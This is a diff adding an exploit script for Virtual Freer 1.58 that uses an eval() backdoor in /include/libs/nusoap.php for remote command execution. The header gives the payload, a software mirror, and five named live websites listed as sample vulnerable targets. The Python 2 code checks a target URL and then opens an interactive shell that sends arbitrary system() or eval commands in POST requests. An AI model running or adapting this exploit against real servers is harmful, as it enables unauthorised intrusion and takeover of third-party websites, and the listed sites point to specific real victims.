@@ -1,0 +1,113 @@
+# Exploit title : Virtual Freer 1.58 - Remote Command Execution
+# Exploit Author : SajjadBnd
+# Date : 2020-02-17
+# Vendor Homepage : http://freer.ir/virtual/
+# Software Link : http://www.freer.ir/virtual/download.php?action=get
+# Software Link(mirror) : http://dl.nuller.ir/virtual_freer_v1.58[NuLLeR.iR].zip
+# Tested on : Ubuntu 19.10
+# Version : 1.58
+############################
+# [ DESCRIPTION ]
+#
+# Free Script For Sell Charging Cards and Virtual Products
+#
+# [POC]
+#
+# Vulnerable file:  /include/libs/nusoap.php
+# 943: eval($_POST['a74ad8dfacd4f985eb3977517615ce25']);
+#
+# POST /include/libs/nusoap.php
+# payload : a74ad8dfacd4f985eb3977517615ce25=system('uname -a');
+#
+# [ Sample Vulnerable Sites ]
+#
+# http://3cure.ir/buy/
+# http://cheapcharger.ir/
+# http://www.appraworld.ir/
+# http://latoon.ir/
+# http://novinv.ir/
+#
+
+import requests
+import os
+import sys
+
+def clear():
+    linux = 'clear'
+    windows = 'cls'
+    os.system([linux, windows][os.name == 'nt'])
+
+def Banner():
+        print '''
+#################################################
+#                                               #
+# Virtual Freer 1.58 - Remote Command Execution #
+#                    SajjadBnd                  #
+#		   BiskooitPedar		#
+#		blackwolf@post.com		#
+#################################################
+'''
+
+def inputs():
+    target = raw_input('[*] URL : ')
+    while True:
+	try:
+            r = requests.get(target,verify=False)
+            start(target)
+        except requests.exceptions.MissingSchema:
+	    target = "http://" + target
+
+def start(target):
+    print "======================\n\n[!] Checking: ****()"
+    url = '%s/include/libs/nusoap.php' % (target)
+    body = {'a74ad8dfacd4f985eb3977517615ce25':'echo vulnerable;'}
+    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
+    content = r.text.encode('utf-8')
+    if 'vulnerable' in content:
+        print "[+] vulnerable: ****()\n"
+    else:
+        print "[-] Target not Vulnerable!"
+	sys.exit(1)
+    print "\n[!] Checking: System()"
+    body = {'a74ad8dfacd4f985eb3977517615ce25':'system(id);'}
+    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
+    content = r.text.decode('utf-8')
+    if 'gid' in content:
+        print "[+] vulnerable: system()\n"
+	osshell(url)
+    else:
+        print "[-] Target not Vulnerable to Running OS Commands!"
+	evalshell(url)
+
+def osshell(url):
+    print "======================\n[+] You can run os commands :D\n"
+    while True:
+	try:
+            cmd = raw_input('OS_SHELL $ ')
+            command = "system('%s');" % (cmd)
+            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
+            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
+            content = r.text.encode('utf-8')
+            print "\n",content
+        except KeyboardInterrupt:
+            print "\n____________________\n[+] GoodBye :D"
+            sys.exit(1)
+
+def evalshell(url):
+    print "======================\n[+] You can just run Eval Commands :D\n"
+    while True:
+	try:
+            cmd = raw_input('\nEval()=> ')
+            command = '%s;' % (cmd)
+            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
+            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
+            content = r.text.encode('utf-8')
+            print "\n",content
+        except KeyboardInterrupt:
+            print "\n____________________\n[+] ok! GoodBye :D"
+            sys.exit(1)
+
+if __name__ == '__main__':
+        clear()
+        Banner()
+	inputs()
